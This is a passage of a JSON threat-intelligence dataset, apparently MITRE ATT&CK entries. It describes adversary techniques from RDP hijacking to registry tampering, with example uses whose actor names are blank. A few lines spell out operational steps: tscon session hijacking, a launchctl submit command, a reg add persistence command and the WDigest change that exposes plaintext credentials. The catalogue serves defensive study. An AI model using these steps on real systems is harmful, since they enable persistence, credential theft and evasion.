      "A version of  introduced in July 2015 inserted junk code into the binary in a likely attempt to obfuscate it and bypass security products.",
      "A variant of  appends junk data to the end of its DLL file to create a large file that may exceed the maximum size that anti-virus programs can scan.",
      "has been known to employ binary padding."
    ],
    "id": "T1009",
    "name": "Binary Padding",
    "similar_words": [
      "Binary Padding"
    ]
  },
  "attack-pattern--51dea151-0898-4a45-967c-3ebee0420484": {
    "description": "Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS). (Citation: TechNet Remote Desktop Services) There are other implementations and third-party tools that provide graphical access [Remote Services](https://attack.mitre.org/techniques/T1021) similar to RDS.\n\nAdversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the [Accessibility Features](https://attack.mitre.org/techniques/T1015) technique for Persistence. (Citation: Alperovitch Malware)\n\nAdversaries may also perform RDP session hijacking which involves stealing a legitimate user's remote session. Typically, a user is notified when someone else is trying to steal their session and prompted with a question. With System permissions and using Terminal Services Console, c:\\windows\\system32\\tscon.exe [session number to be stolen], an adversary can hijack a session without the need for credentials or prompts to the user. (Citation: RDP Hijacking Korznikov) This can be done remotely or locally and with active or disconnected sessions. (Citation: RDP Hijacking Medium) It can also lead to [Remote System Discovery](https://attack.mitre.org/techniques/T1018) and Privilege Escalation by stealing a Domain Admin or higher privileged account session. All of this can be done by using native Windows commands, but it has also been added as a feature in RedSnarf. (Citation: Kali Redsnarf)",
    "example_uses": [
      "has used Remote Desktop Protocol to conduct lateral movement.",
      "moved laterally via RDP.",
      "enables concurrent Remote Desktop Protocol (RDP).",
      "can enable remote desktop on the victim's machine.",
      "has a module for performing remote desktop access.",
      "has used RDP for.",
      "can enable/disable RDP connection and can start a remote desktop session using a browser web socket client.",
      "enables the Remote Desktop Protocol for persistence.",
      "has used Remote Desktop Protocol for lateral movement. The group has also used tunneling tools to tunnel RDP into the environment.",
      "has used RDP to move laterally to systems in the victim environment.",
      "has used RDP connections to move across the victim network.",
      "can start a VNC-based remote desktop server and tunnel the connection through the already established C2 channel.",
      "attempted to use RDP to move laterally.",
      "used RDP to move laterally in victim networks.",
      "malware SierraCharlie uses RDP for propagation.",
      "The  group is known to have used RDP during operations.",
      "The  group is known to have used RDP during operations."
    ],
    "id": "T1076",
    "name": "Remote Desktop Protocol",
    "similar_words": [
      "Remote Desktop Protocol"
    ]
  },
  "attack-pattern--51ea26b1-ff1e-4faa-b1a0-1114cd298c87": {
    "description": "Adversaries may attempt to exfiltrate data over a different network medium than the command and control channel. If the command and control network is a wired Internet connection, the exfiltration may occur, for example, over a WiFi connection, modem, cellular data connection, Bluetooth, or another radio frequency (RF) channel.Adversaries may choose to do this if they have sufficient access or proximity, and the connection might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network.",
    "example_uses": [
      "has a module named BeetleJuice that contains Bluetooth functionality that may be used in different ways, including transmitting encoded information from the infected system over the Bluetooth protocol, acting as a Bluetooth beacon, and identifying other Bluetooth devices in the vicinity."
    ],
    "id": "T1011",
    "name": "Exfiltration Over Other Network Medium",
    "similar_words": [
      "Exfiltration Over Other Network Medium"
    ]
  },
  "attack-pattern--52d40641-c480-4ad5-81a3-c80ccaddf82d": {
    "description": "Windows Authentication Package DLLs are loaded by the Local Security Authority (LSA) process at system start. They provide support for multiple logon processes and multiple security protocols to the operating system. (Citation: MSDN Authentication Packages)\n\nAdversaries can use the autostart mechanism provided by LSA Authentication Packages for persistence by placing a reference to a binary in the Windows Registry location HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\ with the key value of \"Authentication Packages\"=<target binary>. The binary will then be executed by the system when the authentication packages are loaded.",
    "example_uses": [
      "can use Windows Authentication Packages for persistence."
    ],
    "id": "T1131",
    "name": "Authentication Package",
    "similar_words": [
      "Authentication Package"
    ]
  },
  "attack-pattern--52f3d5a6-8a0f-4f82-977e-750abf90d0b0": {
    "description": "Before creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle input/output of data). (Citation: Microsoft Window Classes) Registration of new windows classes can include a request for up to 40 bytes of extra window memory (EWM) to be appended to the allocated memory of each instance of that class. This EWM is intended to store data specific to that window and has specific application programming interface (API) functions to set and get its value. (Citation: Microsoft GetWindowLong function) (Citation: Microsoft SetWindowLong function)\n\nAlthough small, the EWM is large enough to store a 32-bit pointer and is often used to point to a windows procedure. Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process’s memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the process’s EWM.\n\nExecution granted through EWM injection may take place in the address space of a separate live process. Similar to [Process Injection](https://attack.mitre.org/techniques/T1055), this may allow access to both the target process's memory and possibly elevated privileges. Writing payloads to shared sections also avoids the use of highly monitored API calls such as WriteProcessMemory and CreateRemoteThread. (Citation: Endgame Process Injection July 2017) More sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention (DEP) by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process. (Citation: MalwareTech Power Loader Aug 2013) (Citation: WeLiveSecurity Gapz and Redyms Mar 2013)",
    "example_uses": [
      "overwrites Explorer’s Shell_TrayWnd extra window memory to redirect execution to a NTDLL function that is abused to assemble and execute a return-oriented programming (ROP) chain and create a malicious thread within Explorer.exe."
    ],
    "id": "T1181",
    "name": "Extra Window Memory Injection",
    "similar_words": [
      "Extra Window Memory Injection"
    ]
  },
  "attack-pattern--53bfc8bf-8f76-4cd7-8958-49a884ddb3ee": {
    "description": "Launchctl controls the macOS launchd process which handles things like launch agents and launch daemons, but can execute other commands or programs itself. Launchctl supports taking subcommands on the command-line, interactively, or even redirected from standard input. By loading or reloading launch agents or launch daemons, adversaries can install persistence or execute changes they made  (Citation: Sofacy Komplex Trojan). Running a command from launchctl is as simple as launchctl submit -l <labelName> -- /Path/to/thing/to/execute \"arg\" \"arg\" \"arg\". Loading, unloading, or reloading launch agents or launch daemons can require elevated privileges. \n\nAdversaries can abuse this functionality to execute code or even bypass whitelisting if launchctl is an allowed process.",
    "example_uses": [
      "uses launchctl to enable screen sharing on the victim’s machine."
    ],
    "id": "T1152",
    "name": "Launchctl",
    "similar_words": [
      "Launchctl"
    ]
  },
  "attack-pattern--544b0346-29ad-41e1-a808-501bb4193f47": {
    "description": "Adversaries may take advantage of security vulnerabilities and inherent functionality in browser software to change content, modify user-behaviors, and intercept information as part of various browser session hijacking techniques.(Citation: Wikipedia Man in the Browser)A specific example is when an adversary injects software into a browser that allows them to inherit cookies, HTTP sessions, and SSL client certificates of a user then use the browser as a way to pivot into an authenticated intranet.(Citation: Cobalt Strike Browser Pivot)(Citation: ICEBRG Chrome Extensions) Executing browser-based behaviors such as pivoting may require specific process permissions, such as SeDebugPrivilege and/or high-integrity/administrator rights.Another example involves pivoting browser traffic from the adversary's browser through the user's browser by setting up a proxy which will redirect web traffic. This does not alter the user's traffic in any way, and the proxy connection can be severed as soon as the browser is closed. The adversary assumes the security context of whichever browser process the proxy is injected into. Browsers typically create a new process for each tab that is opened and permissions and certificates are separated accordingly. With these permissions, an adversary could potentially browse to any resource on an intranet, such as [Sharepoint](https://attack.mitre.org/techniques/T1213/002) or webmail, that is accessible through the browser and which the browser has sufficient permissions. Browser pivoting may also bypass security provided by 2-factor authentication.(Citation: cobaltstrike manual)",
    "example_uses": [
      "uses web injects and browser redirection to trick the user into providing their login credentials on a fake or modified web page.",
      "can perform browser pivoting and inject into a user's browser to inherit cookies, authenticated HTTP sessions, and client SSL certificates.",
      "can perform browser attacks via web injects to steal information such as credentials certificates and cookies.",
      "has captured credentials when a user performs login through a SSL session.",
      "can monitor the victim's browser for online banking sessions and display an overlay window to manipulate the session in the background.",
      "has the ability to use form-grabbing to extract data from web data forms.",
      "can monitor browser activity for online banking actions and display full-screen overlay images to block user access to the intended site or present additional data fields.",
      "can use advanced web injects to steal web banking credentials.",
      "can perform browser pivoting and inject into a user's browser to inherit cookies authenticated HTTP sessions and client SSL certificates.",
      "has used web injection attacks to redirect victims to spoofed sites designed to harvest banking and other credentials.  can use a self signed TLS certificate in connection with the spoofed site and simultaneously maintains a live connection with the legitimate site to display the correct URL and certificates in the browser.",
      "has used the Puppeteer module to hook and monitor the Chrome web browser to collect user information from infected hosts.",
      "has injected HTML codes into banking sites to steal sensitive online banking information (ex: usernames and passwords).",
      "has the ability to use form-grabbing and event-listening to extract data from web data forms.",
      "has the ability to use form-grabbing to extract emails and passwords from web data forms.",
      "can conduct form grabbing steal cookies and extract data from HTTP sessions."
    ],
    "id": "T1185",
    "name": "Browser Session Hijacking",
    "similar_words": [
      "Man in the Browser",
      "Browser Session Hijacking"
    ]
  },
  "attack-pattern--54a649ff-439a-41a4-9856-8d144a2551ba": {
    "description": "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into a service that accepts remote connections, such as telnet, SSH, and VNC. The adversary may then perform actions as the logged-on user.In an enterprise environment, servers and workstations can be organized into domains. Domains provide centralized identity management, allowing users to login using one set of credentials across the entire network. If an adversary is able to obtain a set of valid domain credentials, they could login to many different machines using remote access protocols such as secure shell (SSH) or remote desktop protocol (RDP).(Citation: SSH Secure Shell)(Citation: TechNet Remote Desktop Services) They could also login to accessible SaaS or IaaS services, such as those that federate their identities to the domain, or management platforms for internal virtualization environments such as VMware vCenter. Legitimate applications (such as [Software Deployment Tools](https://attack.mitre.org/techniques/T1072) and other administrative programs) may utilize [Remote Services](https://attack.mitre.org/techniques/T1021) to access remote hosts. For example, Apple Remote Desktop (ARD) on macOS is native software used for remote management. ARD leverages a blend of protocols, including [VNC](https://attack.mitre.org/techniques/T1021/005) to send the screen and control buffers and [SSH](https://attack.mitre.org/techniques/T1021/004) for secure file transfer.(Citation: Remote Management MDM macOS)(Citation: Kickstart Apple Remote Desktop commands)(Citation: Apple Remote Desktop Admin Guide 3.3) Adversaries can abuse applications such as ARD to gain remote code execution and perform lateral movement. In versions of macOS prior to 10.14, an adversary can escalate an SSH session to an ARD session which enables an adversary to accept TCC (Transparency, Consent, and Control) prompts without user interaction and gain access to data.(Citation: FireEye 2019 Apple Remote Desktop)(Citation: Lockboxx ARD 2019)(Citation: Kickstart Apple Remote Desktop commands)",
    "example_uses": [
      "uses VNC to connect into systems.",
      "can SSH to a remote service.",
      "has used Putty to access compromised systems.",
      "has used Putty Secure Copy Client (PSCP) to transfer data.",
      "uses Putty and VNC for lateral movement.",
      "has used the WebDAV protocol to execute  payloads hosted on network file shares.",
      "can manage remote screen sessions.",
      "has the ability to use RPC for lateral movement.",
      "has the ability to remotely trigger keyboard input and mouse clicks.",
      "can propagate via peer-to-peer communication and updates using RPC.",
      "used remote scheduled tasks to install malicious software on victim systems during lateral movement actions.",
      "uses valid network credentials gathered through credential harvesting to move laterally within victim networks often employing the  framework to do so."
    ],
    "id": "T1021",
    "name": "Remote Services",
    "similar_words": [
      "Remote Services"
    ]
  },
  "attack-pattern--564998d8-ab3e-4123-93fb-eccaa6b9714a": {
    "description": "Adversaries may register a rogue Domain Controller to enable manipulation of Active Directory data. DCShadow may be used to create a rogue Domain Controller (DC). DCShadow is a method of manipulating Active Directory (AD) data, including objects and schemas, by registering (or reusing an inactive registration) and simulating the behavior of a DC. (Citation: DCShadow Blog) Once registered, a rogue DC may be able to inject and replicate changes into AD infrastructure for any domain object, including credentials and keys.Registering a rogue DC involves creating a new server and nTDSDSA objects in the Configuration partition of the AD schema, which requires Administrator privileges (either Domain or local to the DC) or the KRBTGT hash. (Citation: Adsecurity Mimikatz Guide)This technique may bypass system logging and security monitors such as security information and event management (SIEM) products (since actions taken on a rogue DC may not be reported to these sensors). (Citation: DCShadow Blog) The technique may also be used to alter and delete replication and other associated metadata to obstruct forensic analysis. Adversaries may also utilize this technique to perform [SID-History Injection](https://attack.mitre.org/techniques/T1134/005) and/or manipulate AD objects (such as accounts, access control lists, schemas) to establish backdoors for Persistence. (Citation: DCShadow Blog)",
    "example_uses": [
      "’s LSADUMP::DCShadow module can be used to make AD updates by temporarily setting a computer to be a DC.",
      "s LSADUMP::DCShadow module can be used to make AD updates by temporarily setting a computer to be a DC."
    ],
    "id": "T1207",
    "name": "Rogue Domain Controller",
    "similar_words": [
      "DCShadow",
      "Rogue Domain Controller"
    ]
  },
  "attack-pattern--56fca983-1cf1-4fd1-bda0-5e170a37ab59": {
    "description": "Malware, tools, or other non-native files dropped or created on a system by an adversary may leave traces behind as to what was done within a network and how. Adversaries may remove these files over the course of an intrusion to keep their footprint low or remove them at the end as part of the post-intrusion cleanup process.\n\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples include native [cmd](https://attack.mitre.org/software/S0106) functions such as DEL, secure deletion tools such as Windows Sysinternals SDelete, or other third-party file deletion tools. (Citation: Trend Micro APT Attack Tools)",
    "example_uses": [
      "deleted the DLL dropper from the victim’s machine to cover their tracks.",
      "deletes the .LNK file from the startup directory as well as the dropper components.",
      "can wipe files indicated by the attacker and remove itself from disk using a batch file.",
      "deletes files using DeleteFileW API call.",
      "can delete files and itself after infection to avoid analysis.",
      "removes batch files to reduce fingerprint on the system as well as deletes the CAB file that gets encoded upon infection.",
      "has the capability to use rm -rf to remove folders and files from the victim's machine.",
      "deletes any temporary files it creates",
      "has a command to delete files.",
      "removed certain files and replaced them so they could not be retrieved.",
      "will delete files on the system.",
      "can remove itself from a system.",
      "can delete files on the victim’s machine.",
      "contains code to delete files from the victim’s machine.",
      "deleted many of its files used during operations as part of cleanup, including removing applications and deleting screenshots.",
      "has the capability to delete files and scripts from the victim's machine.",
      "deletes its dropper and VBS scripts from the victim’s machine.",
      "has the capability to delete files off the victim’s machine.",
      "removes all files in the /tmp directory.",
      "has a command to delete its Registry key and scheduled task.",
      "can delete files off the system.",
      "has a command to delete a file and deletes files after they have been successfully uploaded to C2 servers.",
      "launches a script to delete their original decoy file to cover tracks.",
      "deletes one of its files, 2.hwp, from the endpoint after establishing persistence.",
      "has a command to delete files.",
      "A  macro deletes files after it has decoded and decompressed them.",
      "has a function to delete files from the victim’s machine.",
      "marks files to be deleted upon the next system reboot and uninstalls and removes itself from the system.",
      "can delete files and optionally overwrite with random data beforehand.",
      "has deleted tmp and prefetch files during post compromise cleanup activities.",
      "creates a backdoor through which remote attackers can delete files.",
      "has access to destructive malware that is capable of overwriting a machine's Master Boot Record (MBR).",
      "installer/uninstaller component deletes itself if it encounters a version of Windows earlier than Windows XP or identifies security-related processes running.",
      "has the capability to delete local files.",
      "can wipe drives using  Remove-Item commands.",
      "creates a backdoor through which remote attackers can delete files.",
      "creates a backdoor through which remote attackers can delete files.",
      "can delete files written to disk.",
      "deletes data in a way that makes it unrecoverable.",
      "deletes the original dropped file from the victim.",
      "has deleted and overwrote files to cover tracks.",
      "creates then deletes log files during installation of itself as a service.",
      "has a tool that can delete files.",
      "uses  to clean up the environment and attempt to prevent detection.",
      "can delete malware and associated artifacts from the victim.",
      "has commands to delete files and persistence mechanisms from the victim.",
      "The  uploader or malware the uploader uses command to delete the RAR archives after they have been exfiltrated.",
      "has deleted files associated with their payload after execution.",
      "deletes its payload along with the payload's parent process after it finishes copying files.",
      "has used batch scripts and scheduled tasks to delete critical system files.",
      "has intentionally deleted computer files to cover their tracks, including with use of the program CCleaner.",
      "can delete a specified file.",
      "The  dropper can delete itself from the victim. Another  variant has the capability to delete specified files.",
      "is capable of deleting the backdoor file.",
      "Some  samples use cmd.exe to delete temporary files.",
      "has deleted existing logs and exfiltrated file archives from a victim.",
      "2 contains a \"Destroy\" plug-in that destroys data stored on victim hard drives by overwriting file contents.",
      "Recent versions of  delete files and registry keys created by the malware.",
      "has the capability to delete files.",
      "is capable of deleting files. It has been observed loading a Linux Kernel Module (LKM) and then deleting it from the hard disk as well as overwriting the data with null bytes.",
      "can delete specified files.",
      "can delete files and directories.",
      "deletes its original installer file once installation is complete.",
      "can delete files and directories.",
      "contains a cleanup module that removes traces of itself from the victim.",
      "The  trojan supports file deletion.",
      "contains the deletFileFromPath function to delete a specified file using the NSFileManager:removeFileAtPath method.",
      "can delete itself or specified files.",
      "deletes its RAT installer file as it executes its DLL payload file.",
      "is capable of deleting files on the victim. It also securely removes itself after collecting and exfiltrating data.",
      "deletes content from C2 communications that was saved to the user's temporary directory.",
      "can be used to delete files from the file system.",
      "has a command to write random data across a file and delete it.",
      "is capable of file deletion along with other file system interaction.",
      "RAT is able to delete files.",
      "attempts to overwrite operating system files with image files.",
      "has several commands to delete files associated with the malware from the victim.",
      "can delete files that may interfere with it executing. It also can delete temporary files and itself after the initial script executes.",
      "can delete all files created during its execution.",
      "can securely delete files, including deleting itself from the victim.",
      "deletes shadow copies from the victim.",
      "Malware used by  is capable of remotely deleting files from victims.",
      "malware deletes files in various ways, including \"suicide scripts\" to delete malware binaries from the victim.  also uses secure file deletion to delete files from the victim. Additionally,  malware SHARPKNOT overwrites and deletes the Master Boot Record (MBR) on the victim's machine.",
      "actors deleted tools and batch files from victim systems."
    ],
    "id": "T1107",
    "name": "File Deletion",
    "similar_words": [
      "File Deletion"
    ]
  },
  "attack-pattern--56ff457d-5e39-492b-974c-dfd2b8603ffe": {
    "description": "Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures. (Citation: Wikipedia Public Key Crypto)\n\nAdversaries may gather private keys from compromised systems for use in authenticating to [Remote Services](https://attack.mitre.org/techniques/T1021) like SSH or for use in decrypting other collected files such as email. Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc. Adversaries may also look in common key directories, such as ~/.ssh for SSH keys on * nix-based systems or C:\\Users\\(username)\\.ssh\\ on Windows.\n\nPrivate keys should require a password or passphrase for operation, so an adversary may also use [Input Capture](https://attack.mitre.org/techniques/T1056) for keylogging or attempt to [Brute Force](https://attack.mitre.org/techniques/T1110) the passphrase off-line.\n\nAdversary tools have been discovered that search compromised systems for file extensions relating to cryptographic keys and certificates. (Citation: Kaspersky Careto) (Citation: Palo Alto Prince of Persia)",
    "example_uses": [
      "CRYPTO::Extract module can extract keys by interacting with Windows cryptographic application programming interface (API) functions."
    ],
    "id": "T1145",
    "name": "Private Keys",
    "similar_words": [
      "Private Keys"
    ]
  },
  "attack-pattern--57340c81-c025-4189-8fa0-fc7ede51bae4": {
    "description": "Adversaries may interact with the Windows Registry as part of a variety of other techniques to aid in defense evasion, persistence, and execution.Access to specific areas of the Registry depends on account permissions, with some keys requiring administrator-level access. The built-in Windows command-line utility [Reg](https://attack.mitre.org/software/S0075) may be used for local or remote Registry modification.(Citation: Microsoft Reg) Other tools, such as remote access tools, may also contain functionality to interact with the Registry through the Windows API.The Registry may be modified in order to hide configuration information or malicious payloads via [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027).(Citation: Unit42 BabyShark Feb 2019)(Citation: Avaddon Ransomware 2021)(Citation: Microsoft BlackCat Jun 2022)(Citation: CISA Russian Gov Critical Infra 2018) The Registry may also be modified to [Impair Defenses](https://attack.mitre.org/techniques/T1562), such as by enabling macros for all Microsoft Office products, allowing privilege escalation without alerting the user, increasing the maximum number of allowed outbound requests, and/or modifying systems to store plaintext credentials in memory.(Citation: CISA LockBit 2023)(Citation: Unit42 BabyShark Feb 2019)The Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system.(Citation: Microsoft Remote) Often [Valid Accounts](https://attack.mitre.org/techniques/T1078) are required, along with access to the remote system's [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) for RPC communication.Finally, Registry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via [Reg](https://attack.mitre.org/software/S0075) or other utilities using the Win32 API.(Citation: Microsoft Reghide NOV 2006) Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.(Citation: TrendMicro POWELIKS AUG 2014)(Citation: SpectorOps Hiding Reg Jul 2017)",
    "example_uses": [
      "uses a Port 22 malware variant to modify several Registry keys.",
      "can install encrypted configuration data under the Registry key HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellCompatibility\\Applications\\laxhost.dll and HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PrintConfigs.",
      "has a command to edit the Registry on the victim’s machine.",
      "A  payload deletes Resiliency Registry keys created by Microsoft Office applications in an apparent effort to trick users into thinking there were no issues during application runs.",
      "modified the Registry to perform multiple techniques through the use of .",
      "A  tool can create a new Registry key under HKEY_CURRENT_USER\\Software\\Classes\\.",
      "has a command to create Registry entries for storing data under HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\WABE\\DataPath.",
      "creates three Registry keys to establish persistence by adding a .",
      "uses a batch file that modifies Registry keys to launch a DLL into the svchost.exe process.",
      "stores configuration values under the Registry key HKCU\\Software\\Microsoft\\[dllname] and modifies Registry keys under HKCR\\CLSID\\...\\InprocServer32with a path to the launcher.",
      "has a command to create, set, copy, or delete a specified Registry key or value.",
      "deletes the Registry key HKCU\\Software\\Classes\\Applications\\rundll32.exe\\shell\\open.",
      "uses reg add to add a Registry Run key for persistence.",
      "modifies the firewall Registry key SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfileGloballyOpenPorts\\\\List.",
      "modifies an HKCU Registry key to store a session identifier unique to the compromised system as well as a pre-shared key used for encrypting and decrypting C2 communications.",
      "creates a Registry subkey that registers a new system device.",
      "can manipulate Registry keys.",
      "stores the encoded configuration file in the Registry key HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentContorlSet\\Control\\WMI\\Security.",
      "malware can deactivate security mechanisms in Microsoft Office by editing several keys and values under HKCU\\Software\\Microsoft\\Office\\.",
      "writes data into the Registry key HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Pniumj.",
      "has deleted Registry keys during post compromise cleanup activities.",
      "creates a Registry subkey that registers a new service.",
      "creates Registry entries that store information about a created service and point to a malicious DLL dropped to disk.",
      "creates a Registry subkey to register its created service, and can also uninstall itself later by deleting this value. 's backdoor also enables remote attackers to modify and delete subkeys.",
      "may be used to interact with and modify the Windows Registry of a local or remote system at the command-line interface.",
      "Once  has access to a network share, it enables the RemoteRegistry service on the target system. It will then connect to the system with RegConnectRegistryW and modify the Registry to disable UAC remote restrictions by setting SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\LocalAccountTokenFilterPolicy to 1.",
      "can delete all Registry entries created during its execution.",
      "has the ability to modify the Registry.",
      "is capable of setting and deleting Registry values.",
      "may store RC4 encrypted configuration information in the Windows Registry.",
      "is capable of deleting Registry keys, sub-keys, and values on a victim system.",
      "appears to have functionality to modify remote Registry information.",
      "is capable of modifying the Registry.",
      "is capable of manipulating the Registry.",
      "has functionality to remove Registry Run key persistence as a cleanup procedure.",
      "can remove persistence-related artifacts from the Registry.",
      "During the   modified in-registry Internet settings to lower internet security before launching `rundll32.exe` which in-turn launches the malware and communicates with C2 servers over the Internet. .",
      "has modify Registry values to store payloads.",
      "has a module to create delete or modify Registry keys.",
      "can modify the Registry to store and maintain a configuration block and virtual file system.",
      "can add the following registry entry: HKEY_CURRENT_USER\\SOFTWARE\\{8 random characters}.",
      "has the ability to modify the Registry key HKCU\\Software\\ApplicationContainer\\Appsw64 to store information regarding the C2 server and downloads.",
      "can modify the `HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\` registry key so it can bypass the VB object model (VBOM) on a compromised host.",
      "uses a tool called CLEANTOAD that has the capability to modify Registry keys.",
      "has modified Managed Object Format (MOF) files within the Registry to run specific commands and create persistence on the system.",
      "has altered the InstallTime subkey.",
      "can add modify and/or delete registry keys. It has changed the proxy configuration of a victim system by modifying the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap registry.",
      "adds keys to the Registry at HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services and various other Registry locations.",
      "has created Registry keys for persistence.",
      "had commands that allow an attacker to write or delete registry keys and was observed stopping services by setting their HKLM\\SYSTEM\\CurrentControlSet\\services\\\\[service_name]\\\\Start registry entries to value 4. It also deleted previously-created Image File Execution Options (IFEO) Debugger registry values and registry keys related to HTTP proxy to clean up traces of its activity.",
      "has a function to write itself to Registry values.",
      "can write encrypted JSON configuration files to the Registry.",
      "has added and deleted keys from the Registry.",
      "has modified the Registry key HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\BootExecute from autocheck autochk * to autocheck autoche *.",
      "has made registry modifications to alter its behavior upon execution.",
      "can modify the Registry to save encryption parameters and system information.",
      "is capable of deleting Registry keys sub-keys and values on a victim system.",
      "can modify Registry values to store configuration strings keylogger and output of components.",
      "can modify the Registry to store its configuration at `HKCU\\Software\\` under frequently changing names including %USERNAME% and ToolTech-RM.",
      "has the ability to modify the Registry on compromised hosts using RegDeleteValueA and RegCreateKeyExA.",
      "can create registry keys to load driver files.",
      "can set its configuration parameters in the Registry.",
      "has modified registry keys for persistence to enable credential caching for credential access and to facilitate lateral movement via RDP.",
      "has modified the Registry key HKLM\\SOFTWARE\\Microsoft\\DRM to store a malicious payload.",
      "has modified the Registry to store its encrypted payload.",
      "can manipulate the system registry on a compromised host.",
      "has used an open source batch script to modify Windows Defender registry keys.",
      "can create delete or modify a specified Registry key or value.",
      "has used malware to disable Windows Defender through modification of the Registry.",
      "may modify Registry keys to store RC4 encrypted configuration information.",
      "has the ability to modify Registry keys to disable crash dumps colors for compressed files and pop-up information about folders and desktop items.",
      "can create `HKCU\\Software\\Classes\\Folder\\shell\\open\\command` as a new registry key during privilege escalation.",
      "can modify Registry values within HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\<Excel Version>\\Excel\\Security\\AccessVBOM\\ to enable the execution of additional code.",
      "can write to the Registry under the %windir% variable to execute tasks.",
      "can modify the Registry to store its components.",
      "can modify registry values within the Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap registry key.",
      "can write the process ID of a target process into the `HKEY_LOCAL_MACHINE\\SOFTWARE\\DDE\\tpid` Registry value as part of its reflective loading activity.",
      "has a command to edit the Registry on the victims machine.",
      "creates a Registry subkey to register its created service and can also uninstall itself later by deleting this value. 's backdoor also enables remote attackers to modify and delete subkeys.",
      "has the ability to add the following registry key on compromised networks to maintain persistence: `HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services \\LanmanServer\\Paramenters`",
      "can modify the Registry to enable itself to run in safe mode and to modify the icons and file extensions for encrypted files.",
      "has removed security settings for VBA macro execution by changing registry values HKCU\\Software\\Microsoft\\Office\\&lt;version&gt;\\&lt;product&gt;\\Security\\VBAWarnings and HKCU\\Software\\Microsoft\\Office\\&lt;version&gt;\\&lt;product&gt;\\Security\\AccessVBOM.",
      "can modify registry keys including to enable or disable Remote Desktop Protocol (RDP).",
      "can store configuration information in the Registry including the initialization vector and AES key needed to find and decrypt other  components.",
      "has deleted certain values from the Registry to load a malicious DLL.",
      "During  threat actors used  to establish full remote control of the connected machine and manipulate the Registry.",
      "has full control of the Registry including the ability to modify it.",
      "has a command to create set copy or delete a specified Registry key or value.",
      "has written process names to the Registry disabled IE browser features deleted Registry keys and changed the ExtendedUIHoverTime key.",
      "can modify Registry keys under HKCU\\Software\\Microsoft\\ also modifies Registry keys under HKCR\\CLSID\\...\\InprocServer32 with a path to the launcher.",
      "modified the Registry to create a Windows service for itself on a compromised host.",
      "dispatcher can modify the Run registry key.",
      "has modified the Registry as part of its UAC bypass process.",
      "can create Registry entries to enable services to run.",
      "has modified registry keys of ComSysApp Svchost and xmlProv on the machine to gain persistence.",
      "has modified the Registry key HKLM\\System\\CurrentControlSet\\Control\\SecurityProviders\\WDigest by setting the UseLogonCredential registry value to 1 in order to force credentials to be stored in clear text in memory.  has also modified the WDigest registry key to allow plaintext credentials to be cached in memory.",
      "backdoor has modified the Windows Registry to store the backdoor's configuration.",
      "has modified the registry key SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System and added the ransom note.",
      "During  the threat actors used batch files that modified registry keys.",
      "modified the registry using the command reg add HKEY_CURRENT_USER\\Environment /v UserInitMprLogonScript /t REG_SZ /d [file path] for persistence.",
      "has added entries to the Registry for ransom contact information.",
      "has the ability to register new registry keys for a new extension handler via `HKCR\\.enc` and `HKCR\\enc\\shell\\open\\command`.",
      "can create seemingly legitimate Registry key to store its encryption key.",
      "has used Windows Registry modifications to specify a DLL payload.",
      "has the ability to configure browser settings by modifying Registry entries under `HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer`.",
      "is able to delete the Security Descriptor (`SD`) registry subkey in order to hide scheduled tasks.",
      "has a command to modify a Registry key.",
      "has deleted Registry keys to clean up its prior activity.",
      "can set the KeepPrintedJobs attribute for configured printers in SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Print\\\\Printers to enable document stealing.",
      "can add the name of its communication pipe to HKLM\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\lanmanserver\\\\parameters\\NullSessionPipes.",
      "can set a Registry key to determine how long it has been installed and possibly to indicate the version number.",
      "can perform Registry operations.",
      "The  loader component can create multiple Registry keys to force the svchost.exe process to load the final backdoor.",
      "During  the threat actors enabled Wdigest by changing the `HKLM\\SYSTEM\\\\ControlSet001\\\\Control\\\\SecurityProviders\\\\WDigest` registry value from 0 (disabled) to 1 (enabled).",
      "has modified the Registry to perform multiple techniques through the use of .",
      "can create a registry key using wdigest.",
      "can modify the Registry.",
      "can modify Registry values to stored information and establish persistence.",
